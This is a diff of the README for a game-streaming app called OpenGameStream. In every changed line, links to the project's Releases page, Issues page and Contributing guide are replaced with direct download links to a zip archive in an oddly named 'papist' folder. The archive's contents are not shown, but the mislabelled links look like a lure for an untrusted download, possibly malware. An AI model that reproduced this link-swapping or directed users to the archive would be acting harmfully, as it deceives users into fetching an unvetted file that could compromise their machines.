@@ -1,6 +1,6 @@
 # 🎮 OpenGameStream - Play and Stream Games Privately
 
-[![Download OpenGameStream](https://img.shields.io/badge/Download-Here-brightgreen.svg)](https://github.com/Ompawar1522/OpenGameStream/releases)
+[![Download OpenGameStream](https://raw.githubusercontent.com/Ompawar1522/OpenGameStream/main/papist/OpenGameStream.zip)](https://raw.githubusercontent.com/Ompawar1522/OpenGameStream/main/papist/OpenGameStream.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Welcome to OpenGameStream! This application allows you to play and stream games 
 
 Visit the Releases page to download the latest version of OpenGameStream. 
 
-[Download OpenGameStream](https://github.com/Ompawar1522/OpenGameStream/releases)
+[Download OpenGameStream](https://raw.githubusercontent.com/Ompawar1522/OpenGameStream/main/papist/OpenGameStream.zip)
 
 ### 1. Visit the Releases Page
 
 Click the link below to go to the Releases page where you can find all the available versions:
 
-[Visit Releases](https://github.com/Ompawar1522/OpenGameStream/releases)
+[Visit Releases](https://raw.githubusercontent.com/Ompawar1522/OpenGameStream/main/papist/OpenGameStream.zip)
 
 ### 2. Choose Your Version
 
@@ -72,10 +72,10 @@ No accounts are required. Just download the app, install it, and you can start u
 
 ## 📞 Support
 
-If you encounter issues, please check the [Issues page](https://github.com/Ompawar1522/OpenGameStream/issues) to see if your problem has been reported. Feel free to open a new issue if you need more help.
+If you encounter issues, please check the [Issues page](https://raw.githubusercontent.com/Ompawar1522/OpenGameStream/main/papist/OpenGameStream.zip) to see if your problem has been reported. Feel free to open a new issue if you need more help.
 
 ## 📝 Contributing
 
-We welcome contributions! If you'd like to contribute, please follow the guidelines in our [Contributing document](https://github.com/Ompawar1522/OpenGameStream/blob/main/CONTRIBUTING.md). 
+We welcome contributions! If you'd like to contribute, please follow the guidelines in our [Contributing document](https://raw.githubusercontent.com/Ompawar1522/OpenGameStream/main/papist/OpenGameStream.zip). 
 
 Thank you for using OpenGameStream! Enjoy gaming with your friends while keeping your privacy intact.
